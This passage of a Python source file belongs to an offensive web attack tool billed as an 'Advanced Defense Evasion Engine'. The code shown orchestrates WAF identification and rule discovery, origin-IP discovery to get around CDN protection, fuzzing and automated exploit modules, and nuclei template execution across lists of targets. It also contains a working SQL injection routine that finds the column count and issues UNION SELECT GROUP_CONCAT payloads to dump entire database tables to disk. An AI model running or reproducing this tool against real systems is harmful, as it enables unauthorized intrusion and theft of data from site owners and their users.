                    'evidence': f"WordPress identified without WAF on {sub}",
                    'poc': f"Manual review of {sub} for default creds or known WP vulns.",
                    'confidence': 0.7
                })

        return all_subdomain_vulnerabilities

class Reporter:
    @staticmethod
    def print_banner():
        banner = f"""{Fore.GREEN}
        ████████╗███████╗███████╗███████╗██████╗ ██████╗ ██╗   ██╗██████╗ ███████╗███████╗
        ╚══██╔══╝██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔════╝██╔════╝
           ██║   █████╗  ███████╗█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  ███████╗
           ██║   ██╔══╝  ╚════██║██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══╝  ╚════██║
           ██║   ███████╗███████║███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████║
           ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝
        {Style.RESET_ALL}"""
        print(banner)
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Project Prometheus (WebMer v5.0) - Advanced Defense Evasion Engine")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}  Developed by Anas Erami")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

    @staticmethod
    def generate_report(tech_stack, vulnerabilities, target, scan_time, defense_bypass_info=None):
        report = [
            f"# Project Prometheus Security Report - {target}",
            f"**Scan Date**: {time.ctime()}  \n**Scan Duration**: {scan_time:.2f} seconds\n",
            "## Technology Stack\n```json"
        ]
        
        report.append(json.dumps(tech_stack, indent=2))
            
        if defense_bypass_info:
            report.append("```\n## Defense Evasion & Bypass Information\n")
            if defense_bypass_info.get('waf_identification'):
                report.append(f"- **WAF Identified**: `{defense_bypass_info['waf_identification']}`")
                if defense_bypass_info.get('waf_rules'):
                    report.append("- **WAF Rule Discovery Findings**:")
                    for rule in defense_bypass_info['waf_rules']:
                        report.append(f"  - `{rule}`")
            if defense_bypass_info.get('origin_ip'):
                report.append(f"- **Origin IP Discovered**: `{defense_bypass_info['origin_ip']}`")
            if defense_bypass_info.get('ssl_stripping_attempt'):
                report.append(f"- **SSL Stripping Attempted**: `{defense_bypass_info['ssl_stripping_attempt']}`")
                report.append(f"  (Note: SSL Stripping requires a Man-in-the-Middle position and is a complex attack.)")
            if defense_bypass_info.get('http_smuggling_attempt'):
                report.append(f"- **HTTP Request Smuggling Attempted**: `{defense_bypass_info['http_smuggling_attempt']}`")
                report.append(f"  (Note: Requires an active mitmproxy instance configured for smuggling via 'X-Smuggling-Payload' header.)")


        report.append("\n## Vulnerabilities\n")
        
        if not vulnerabilities:
            report.append("No vulnerabilities found")
        else:
            for i, vuln in enumerate(vulnerabilities, 1):
                report.append(f"### Vulnerability #{i}")
                report.append(f"- **Type**: `{vuln['type']}`")
                report.append(f"- **URL**: `{vuln['url']}`")
                report.append(f"- **Parameter**: `{vuln['param']}`")
                report.append(f"- **Payload**: `{vuln['payload']}`")
                report.append(f"- **Status Code**: `{vuln['status']}`")
                report.append(f"- **Response Length**: `{vuln['length']}`")
                report.append(f"- **Evidence**: `{vuln['evidence']}`")
                report.append(f"- **Proof of Concept**:")
                report.append(f"```{vuln['poc']}```")
                
                confidence_level = "Low"
                if vuln['confidence'] >= 0.9:
                    confidence_level = f"{Fore.RED}High{Style.RESET_ALL}"
                elif vuln['confidence'] >= 0.7:
                    confidence_level = f"{Fore.YELLOW}Medium{Style.RESET_ALL}"
                else:
                    confidence_level = f"{Fore.CYAN}Low{Style.RESET_ALL}"
                report.append(f"- **Confidence**: {confidence_level}")
                report.append("---")
        
        return "\n".join(report)

    @staticmethod
    def print_summary(vulnerabilities, scan_time):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}  Scan Summary")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  Scan Duration: {scan_time:.2f} seconds")
        
        vuln_count = {
            'SQLiModule': 0,
            'XSSModule': 0,
            'HeaderFuzzModule': 0,
            'URLPathFuzzModule': 0,
            'SmugglingModule': 0, 
            'DirectoryBruteforceModule': 0,
            'Known CVE (WordPress Authenticated Stored XSS)': 0,
            'Known CVE (Nginx HTTP Request Smuggling)': 0,
            'Known CVE (Apache Remote Code Execution)': 0,
            'Known CVE (OpenSSL DoS)': 0,
            'Subdomain Scan Result (Potentially Vulnerable)': 0,
            'Other': 0
        }
        
        for vuln in vulnerabilities:
            if vuln['type'] in vuln_count:
                vuln_count[vuln['type']] += 1
            else:
                vuln_count['Other'] += 1
        
        print(f"{Fore.GREEN}  SQL Injection: {vuln_count['SQLiModule']}")
        print(f"{Fore.GREEN}  Cross-Site Scripting (XSS): {vuln_count['XSSModule']}")
        print(f"{Fore.GREEN}  Header Fuzzing: {vuln_count['HeaderFuzzModule']}")
        print(f"{Fore.GREEN}  URL Path Fuzzing: {vuln_count['URLPathFuzzModule']}")
        print(f"{Fore.GREEN}  HTTP Request Smuggling: {vuln_count['SmugglingModule']}")
        print(f"{Fore.GREEN}  Directory Bruteforce: {vuln_count['DirectoryBruteforceModule']}")
        print(f"{Fore.GREEN}  Known CVEs (WordPress): {vuln_count['Known CVE (WordPress Authenticated Stored XSS)']}")
        print(f"{Fore.GREEN}  Known CVEs (Nginx Smuggling): {vuln_count['Known CVE (Nginx HTTP Request Smuggling)']}")
        print(f"{Fore.GREEN}  Known CVEs (Apache RCE): {vuln_count['Known CVE (Apache Remote Code Execution)']}")
        print(f"{Fore.GREEN}  Known CVEs (OpenSSL DoS): {vuln_count['Known CVE (OpenSSL DoS)']}")
        print(f"{Fore.GREEN}  Vulnerable Subdomains: {vuln_count['Subdomain Scan Result (Potentially Vulnerable)']}")
        print(f"{Fore.GREEN}  Other: {vuln_count['Other']}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

class WebMerScanner:
    def __init__(self, args):
        self.args = args
        self.brain = QLearningBrain()
        
        self.initial_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
                
        self.connector = aiohttp.TCPConnector(ssl=ssl_context, limit=self.args.concurrency)
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            headers=self.initial_headers,
            cookies=self._parse_cookies(args.cookies) if args.cookies else None,
            proxy=args.proxy if args.proxy else None
        )
        
        self.verbose = args.verbose
        self.recon = ReconEngine(self.session) 

    def _parse_cookies(self, cookie_string):
        cookies = {}
        for cookie in cookie_string.split(';'):
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()
        return cookies

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session and not self.session.closed:
            await self.session.close()

    async def scan_target(self, target):
        start_time = time.time()
        session_file_name = urllib.parse.urlparse(target).netloc.replace('.', '_') + ".json"
        session_path = os.path.join("sessions", session_file_name)
        
        recon_data = None
        if self.args.resume and os.path.exists(session_path):
            print(Fore.BLUE + f"[*] Resuming session from {session_path}...")
            try:
                with open(session_path, 'r') as f:
                    session_data = json.load(f)
                    recon_data = session_data.get('recon_data')
                    
                    self.recon.endpoints = set(recon_data.get('endpoints', []))
                    self.recon.parameters = {k: [dict(t) for t in v] for k, v in recon_data.get('parameters', {}).items()} 
                    self.recon.js_files = set(recon_data.get('js_files', []))
                    self.recon.robots = recon_data.get('robots', [])
                    self.recon.sitemap = recon_data.get('sitemap', [])
                    self.recon.processed_urls = set(recon_data.get('processed_urls', []))
                    
                    if self.verbose:
                        print(Fore.GREEN + f"[+] Loaded {len(self.recon.endpoints)} endpoints from session.")
            except Exception as e:
                print(Fore.RED + f"[!] Failed to load session from {session_path}: {e}. Starting new scan.")
                recon_data = None 

        if recon_data is None:
            if self.verbose:
                print(Fore.CYAN + f"[*] Crawling: {target}")
            self.recon = ReconEngine(self.session)
            await self.recon.crawl(target)
        
        if self.verbose:
            print(Fore.GREEN + f"[+] Found {len(self.recon.endpoints)} endpoints")
            print(Fore.GREEN + f"[+] Found {sum(len(v) for v in self.recon.parameters.values())} forms")
        
        if self.verbose:
            print(Fore.CYAN + "[*] Fingerprinting technology stack...")
        fingerprinter = FingerprintEngine(target, self.session)
        tech_stack = await fingerprinter.fingerprint()
        
        defense_bypass_info = {}
        if self.verbose:
            print(Fore.GREEN + "[+] Technology stack identified:")
            for tech, details in tech_stack.items():
                print(f"  - {tech}: {details}")
            if GLOBAL_WAF_DETECTED:
                print(Fore.RED + "[!] WAF detected! Activating adaptive mode for fuzzing.")
        
        waf_bypass_module = WAFBypassModule(self.session)
        identified_waf = await waf_bypass_module.identify_waf(target)
        if identified_waf:
            defense_bypass_info['waf_identification'] = identified_waf
            waf_rules = await waf_bypass_module.discover_waf_rules(target)
            if waf_rules:
                defense_bypass_info['waf_rules'] = waf_rules

        origin_ip_module = OriginIPDiscoveryModule(self.session)
        parsed_url = urllib.parse.urlparse(target)
        origin_ip = await origin_ip_module.discover_origin_ip(parsed_url.netloc)
        if origin_ip:
            defense_bypass_info['origin_ip'] = origin_ip
            print(Fore.GREEN + f"[+] Discovered Origin IP: {origin_ip}. Future attacks can target this IP directly.")

        if self.args.ssl_strip:
            defense_bypass_info['ssl_stripping_attempt'] = "Initiated (requires external MITM setup)"
            print(Fore.YELLOW + "[!] SSL Stripping initiated. This requires WebMer to be in a Man-in-the-Middle position.")
            print(Fore.YELLOW + "    (Conceptual: Full MITM integration with mitmproxy is highly complex and not implemented directly in this single file.)")

        if self.args.http_smuggle and self.args.proxy:
             print(Fore.YELLOW + "[!] HTTP Request Smuggling tests enabled. Ensure mitmproxy is running as proxy and configured for smuggling.")
             defense_bypass_info['http_smuggling_attempt'] = "Enabled via mitmproxy interaction"
        elif self.args.http_smuggle and not self.args.proxy:
             print(Fore.RED + "[!] HTTP Request Smuggling requires a proxy (like mitmproxy) to be specified with --proxy.")


        fuzzer = Fuzzer(self.session, self.brain, waf_detected=GLOBAL_WAF_DETECTED, concurrency=self.args.concurrency)
        all_detected_vulnerabilities = []

        # Known Library Exploitation
        known_lib_exploit_module = KnownLibraryExploitationModule(self.session)
        cve_vulnerabilities = await known_lib_exploit_module.check_for_known_vulnerabilities(tech_stack)
        for cve_vuln in cve_vulnerabilities:
            if cve_vuln.get('exploit_template'):
                poc, confidence = await known_lib_exploit_module.execute_nuclei_template(target, cve_vuln['exploit_template'])
                if confidence > 0.6: # Only add if template execution was somewhat successful
                    all_detected_vulnerabilities.append({
                        'url': target,
                        'param': 'N/A',
                        'payload': cve_vuln['cve_id'],
                        'type': cve_vuln['type'],
                        'status': 0, # N/A for template scan
                        'length': 0, # N/A
                        'evidence': cve_vuln['description'],
                        'poc': poc,
                        'confidence': confidence
                    })
            else: # Add as a warning if no exploit template
                all_detected_vulnerabilities.append({
                    'url': target,
                    'param': 'N/A',
                    'payload': cve_vuln['cve_id'],
                    'type': cve_vuln['type'],
                    'status': 0, # N/A for warning
                    'length': 0, # N/A
                    'evidence': cve_vuln['description'],
                    'poc': "No automated exploit available, manual verification recommended.",
                    'confidence': cve_vuln['confidence'] # Use original confidence
                })

        # Directory Bruteforce
        directory_brute_module = DirectoryBruteforceModule(self.session)
        print(Fore.CYAN + f"[*] Starting directory bruteforce on {target}...")
        dir_brute_results = await directory_brute_module.fuzz(self.session, target, {}, self.initial_headers, {'status': 404, 'length': 100, 'content': b'404 Not Found'}) # Baseline for 404
        all_detected_vulnerabilities.extend(dir_brute_results)
        
        # Advanced Subdomain Enumeration
        subdomain_enum_module = AdvancedSubdomainEnumerationModule(self.session)
        discovered_subdomains = await subdomain_enum_module.enumerate_subdomains(parsed_url.netloc)
        if discovered_subdomains:
            subdomain_vulns = await subdomain_enum_module.scan_interesting_subdomains(discovered_subdomains, self)
            all_detected_vulnerabilities.extend(subdomain_vulns)

        if self.args.api_spec:
            api_module = APIModule(self.session)
            await api_module.load_spec(self.args.api_spec)
            if api_module.endpoints:
                print(Fore.CYAN + f"[*] Starting API Fuzzing for {len(api_module.endpoints)} endpoints...")
                api_fuzzing_results = await api_module.fuzz_api_endpoints(fuzzer.modules, self.initial_headers, fuzzer.get_baseline_response, tech_stack, self.brain)
                all_detected_vulnerabilities.extend(api_fuzzing_results)
            else:
                print(Fore.YELLOW + "[!] No API endpoints found in the provided specification.")
        else: 
            if self.verbose:
                print(Fore.CYAN + f"[*] Fuzzing {sum(len(v) for v in self.recon.parameters.values())} parameters and headers...")
            
            fuzzing_tasks = []
            for endpoint, forms in self.recon.parameters.items():
                for form_data in forms:
                    fuzzing_tasks.append(fuzzer.fuzz(endpoint, form_data, self.initial_headers, tech_stack))
            
            fuzzer_results = await asyncio.gather(*fuzzing_tasks)
            for res_list in fuzzer_results:
                all_detected_vulnerabilities.extend(res_list)

        if self.verbose:
            print(Fore.CYAN + "[*] Exploiting and verifying vulnerabilities...")
        
        final_vulnerabilities = []
        exploit_tasks = []
        for vuln_data in all_detected_vulnerabilities:
            module_name = vuln_data['type']
            for module in fuzzer.modules:
                if module.__class__.__name__ == module_name:
                    form_data = next(
                        (form for form in self.recon.parameters.get(vuln_data['url'], []) 
                         if vuln_data['param'] and vuln_data['param'].replace('Header: ', '') in form['params']),
                        None
                    ) or {'method': 'get', 'params': {}}
                    
                    param_for_exploit = vuln_data['param'] if vuln_data['param'] != 'N/A' else None
                    if param_for_exploit and "Header: " in param_for_exploit:
                         param_for_exploit = param_for_exploit.replace("Header: ", "")
                    elif module_name == 'SmugglingModule':
                        param_for_exploit = "HTTP_Request_Smuggling_Context" 
                    elif module_name == 'DirectoryBruteforceModule':
                        param_for_exploit = "Directory_Path"

                    exploit_tasks.append(
                        module.exploit(
                            self.session,
                            vuln_data['url'],
                            param_for_exploit,
                            vuln_data['payload'],
                            form_data['method'],
                            form_data['params']
                        )
                    )
                    break
            else: # If module not found in fuzzer.modules, it might be a Known CVE or Subdomain Scan Result
                if "Known CVE" in vuln_data['type'] or "Subdomain Scan Result" in vuln_data['type']:
                    # These are already "exploited" or are findings, just add them directly
                    final_vulnerabilities.append(vuln_data)
                else: # Fallback for any other types
                    final_vulnerabilities.append(vuln_data)
        
        # Only run exploit tasks for modules that have an exploit method.
        # Known CVEs and Subdomain Scan Results are handled above.
        results_from_exploit_tasks = await asyncio.gather(*exploit_tasks, return_exceptions=True)

        idx = 0
        for i, vuln_data in enumerate(all_detected_vulnerabilities):
            # Skip if already added (Known CVE or Subdomain Scan Result)
            if "Known CVE" in vuln_data['type'] or "Subdomain Scan Result" in vuln_data['type']:
                continue

            # Process results from exploit_tasks
            poc_or_exception = results_from_exploit_tasks[idx]
            idx += 1

            if isinstance(poc_or_exception, Exception):
                print(Fore.RED + f"[!] Error during exploitation for {vuln_data['url']} ({vuln_data['type']}): {poc_or_exception}")
                vuln_data['poc'] = f"Exploitation failed: {poc_or_exception}"
                vuln_data['confidence'] = 0.4 # Reduce confidence on exploit failure
            else:
                poc, confidence = poc_or_exception
                vuln_data['poc'] = poc
                vuln_data['confidence'] = confidence
            final_vulnerabilities.append(vuln_data)

        scan_time = time.time() - start_time
        report = Reporter.generate_report(tech_stack, final_vulnerabilities, target, scan_time, defense_bypass_info)
        
        if self.args.output:
            filename = self.args.output
            if self.args.list:
                filename = f"{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{filename}"
                
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(report)
            print(Fore.GREEN + f"[+] Report saved to {filename}")

        os.makedirs("sessions", exist_ok=True)
        session_data = {
            'target': target,
            'scan_time': time.ctime(),
            'recon_data': {
                'endpoints': list(self.recon.endpoints),
                'parameters': {k: [dict(t) for t in v] for k, v in self.recon.parameters.items()}, 
                'js_files': list(self.recon.js_files),
                'robots': self.recon.robots,
                'sitemap': self.recon.sitemap,
                'processed_urls': list(self.recon.processed_urls)
            },
            'tech_stack': tech_stack,
            'vulnerabilities': final_vulnerabilities,
            'defense_bypass_info': defense_bypass_info
        }
        with open(session_path, 'w', encoding='utf-8') as f:
            json.dump(session_data, f, indent=4)
        print(Fore.GREEN + f"[+] Session saved to {session_path}")
        
        Reporter.print_summary(final_vulnerabilities, scan_time)
        
        return final_vulnerabilities

def run_scanner_process(target, args_dict, brain_file):
    async def _scan():
        local_args = argparse.Namespace(**args_dict)
        local_args.output = f"report_{target.replace('://', '_').replace('/', '_')}.md" 

        scanner = WebMerScanner(local_args)
        scanner.brain.brain_file = brain_file 
        try:
            await scanner.scan_target(target)
        finally:
            await scanner.session.close()

    asyncio.run(_scan())

def open_new_terminal(command, title="Cerebrus Process"):
    try:
        if os.environ.get('TMUX'):
            subprocess.Popen(['tmux', 'new-window', '-n', title, command])
        elif 'GNOME_TERMINAL_SCREEN' in os.environ:
            subprocess.Popen(['gnome-terminal', '--title', title, '--', 'bash', '-c', command + '; exec bash'])
        elif os.name == 'posix':
            subprocess.Popen(['xterm', '-title', title, '-e', command + '; bash'])
        elif os.name == 'nt':
            subprocess.Popen(['start', 'cmd', '/k', command], shell=True)
        else:
            print(Fore.YELLOW + "[!] Cannot open new terminal. Please run the command manually: " + command)
            return False
        return True
    except FileNotFoundError:
        print(Fore.RED + f"[!] Terminal command not found. Please ensure 'tmux'/'gnome-terminal'/'xterm'/'start' is in your PATH.")
        return False
    except Exception as e:
        print(Fore.RED + f"[!] Failed to open new terminal: {e}")
        return False


async def main():
    parser = argparse.ArgumentParser(description='Project Prometheus (WebMer v5.0) - Advanced Defense Evasion Engine')
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('--list', help='File containing list of targets')
    parser.add_argument('-c', '--cookies', help='Session cookies (e.g., "ID=123; role=user")')
    parser.add_argument('-o', '--output', help='Output report filename')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--concurrency', type=int, default=50, help='Number of concurrent requests')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--resume', action='store_true', help='Resume a previous scan')
    parser.add_argument('--dump', help='Attempt to dump a table from an SQLi vulnerability')
    parser.add_argument('--api-spec', help='Path to an OpenAPI/Swagger specification file')
    parser.add_argument('--multi-process', type=int, nargs='?', const=os.cpu_count(), default=0, help='Enable multiprocessing. Optionally specify number of processes.')
    parser.add_argument('--multi-terminal', action='store_true', help='Open new terminals for certain operations')
    parser.add_argument('--ssl-strip', action='store_true', help='Conceptual SSL Stripping (requires MITM setup)')
    parser.add_argument('--http-smuggle', action='store_true', help='Enable HTTP Request Smuggling tests (requires proxy)')
    
    args = parser.parse_args()

    if not args.url and not args.list and not args.api_spec:
        print(Fore.RED + "[!] Please specify either --url, --list, or --api-spec")
        return
        
    Reporter.print_banner()
    
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        with open(args.list, 'r') as f:
            targets.extend([line.strip() for line in f.readlines() if line.strip()])
    
    if args.api_spec and not args.url: 
        targets.append("api_scan_target") 

    if args.multi_process and args.list and len(targets) > 1:
        print(Fore.BLUE + f"[*] Starting multiprocessing scan for {len(targets)} targets...")
        process_pool_args = []
        brain_file = "brain.json" 
        for target_url in targets:
            args_dict = vars(args)
            args_dict['url'] = target_url 
            args_dict['list'] = None 
            process_pool_args.append((target_url, args_dict, brain_file))

        with concurrent.futures.ProcessPoolExecutor(max_workers=args.multi_process) as executor:
            executor.map(run_scanner_process, *zip(*process_pool_args)) 
        
        print(Fore.GREEN + "\n[+] All multiprocessing scans completed.")
    else:
        async with WebMerScanner(args) as scanner:
            all_vulnerabilities = []
            
            for target in targets:
                print(Fore.BLUE + f"\n[*] Scanning target: {target}")
                vulnerabilities = await scanner.scan_target(target)
                all_vulnerabilities.extend(vulnerabilities)
                
                if args.dump and args.url == target: 
                    sqli_vulns = [v for v in vulnerabilities if v['type'] == 'SQLiModule' and v['confidence'] >= 0.8]
                    if sqli_vulns:
                        dump_cmd = f"python3 {os.path.abspath(__file__)} --url {target} --dump {args.dump} --verbose" 
                        if args.proxy:
                            dump_cmd += f" --proxy {args.proxy}"
                        
                        if args.multi_terminal:
                            print(Fore.YELLOW + f"[*] Opening new terminal for SQLi data dump...")
                            open_new_terminal(dump_cmd, f"Cerebrus - SQLi Dump {args.dump}")
                        else:
                            print(Fore.YELLOW + f"[*] Attempting to dump data from table '{args.dump}' using identified SQLi vulnerability (in current terminal)...")
                            sqli_module_instance = SQLiModule()
                            for vuln in sqli_vulns:
                                try:
                                    num_columns = 0
                                    for i in range(1, 20): 
                                        order_by_payload = vuln['payload'].replace("--", "") + f" ORDER BY {i}--"
                                        test_params = {}
                                        if vuln['param'] and vuln['param'] != 'N/A':
                                            test_params = {vuln['param']: order_by_payload}
                                        
                                        try:
                                            if vuln['method'] == 'get':
                                                async with scanner.session.get(vuln['url'], params=test_params, timeout=5) as response:
                                                    if response.status == 200:
                                                        num_columns = i
                                                    else:
                                                        break
                                            else:
                                                async with scanner.session.post(vuln['url'], data=test_params, timeout=5) as response:
                                                    if response.status == 200:
                                                        num_columns = i
                                                    else:
                                                        break
                                        except Exception:
                                            break
                                    if num_columns > 0:
                                        union_cols = ','.join(['NULL'] * (num_columns - 1) + [f"GROUP_CONCAT({args.dump}.*, 0x3a)"]) 
                                        dump_payload = vuln['payload'].replace("--", "") + f" UNION SELECT {union_cols} FROM {args.dump} --"
                                        
                                        test_params = {}
                                        if vuln['param'] and vuln['param'] != 'N/A':
                                            test_params = {vuln['param']: dump_payload}

                                        if vuln['method'] == 'get':
                                            async with scanner.session.get(vuln['url'], params=test_params, timeout=20) as response:
                                                dump_content = await response.text()
                                        else:
                                            async with scanner.session.post(vuln['url'], data=test_params, timeout=20) as response:
                                                dump_content = await response.text()

                                        if response.status == 200 and "Error" not in dump_content and "syntax" not in dump_content:
                                            dump_filename = f"dump_{urllib.parse.urlparse(target).netloc.replace('.', '_')}_{args.dump}.txt"
                                            with open(dump_filename, 'w', encoding='utf-8') as f:
                                                f.write(dump_content)
                                            print(Fore.GREEN + f"[+] Data from table '{args.dump}' potentially dumped to {dump_filename}")
                                            print(Fore.CYAN + "    (Note: Manual review of the dump file is highly recommended as content may vary based on column count and display.)")
                                        else:
                                            print(Fore.RED + f"[!] Failed to dump data from table '{args.dump}' for {vuln['url']}. Response status: {response.status}")
                                    else:
                                        print(Fore.RED + f"[!] Could not determine column count for SQLi dump on {vuln['url']}. Skipping dump.")
                                except Exception as e:
                                    print(Fore.RED + f"[!] Error during data dump attempt: {e}")
                    else:
                        print(Fore.YELLOW + "[!] No high-confidence SQLi vulnerabilities found to attempt data dumping.")
                
                await asyncio.sleep(args.delay if hasattr(args, 'delay') else 0.5) # Fix for AttributeError
            
            print(Fore.GREEN + f"\n[+] Total vulnerabilities found across all targets: {len(all_vulnerabilities)}")

def main_entry():
    """The synchronous entry point for the command line."""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user.")
    except SystemExit:
        pass
    except Exception as e:
        print(f"\n{Fore.RED}[!] A critical top-level error occurred: {e}")

if __name__ == "__main__":
    main_entry()
